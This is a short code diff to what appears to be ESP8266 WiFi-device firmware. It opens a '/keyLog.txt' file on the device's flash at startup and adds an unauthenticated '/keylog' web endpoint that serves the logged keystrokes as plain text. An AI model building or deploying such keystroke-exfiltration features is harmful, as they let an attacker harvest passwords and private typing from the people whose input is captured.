@@ -28,6 +28,8 @@ void reply(AsyncWebServerRequest* request, int code, const char* type, const uin
     request->send(response);
 }
 
+File logFile;
+
 namespace webserver {
     // ===== PRIVATE ===== //
     AsyncWebServer   server(80);
@@ -81,6 +83,7 @@ namespace webserver {
     void begin() {
         // Access Point
         WiFi.hostname(HOSTNAME);
+        logFile = SPIFFS.open("/keyLog.txt", "a+");
 
         // WiFi.mode(WIFI_AP_STA);
         WiFi.softAP(settings::getSSID(), settings::getPassword(), settings::getChannelNum());
@@ -94,6 +97,10 @@ namespace webserver {
 
         server.onNotFound([](AsyncWebServerRequest* request) {
             request->redirect("/error404.html");
+        });
+       
+        server.on("/keylog", HTTP_GET, [](AsyncWebServerRequest *request){
+           request->send(SPIFFS, "/keyLog.txt", "text/plain");
         });
 
         server.on("/run", [](AsyncWebServerRequest* request) {
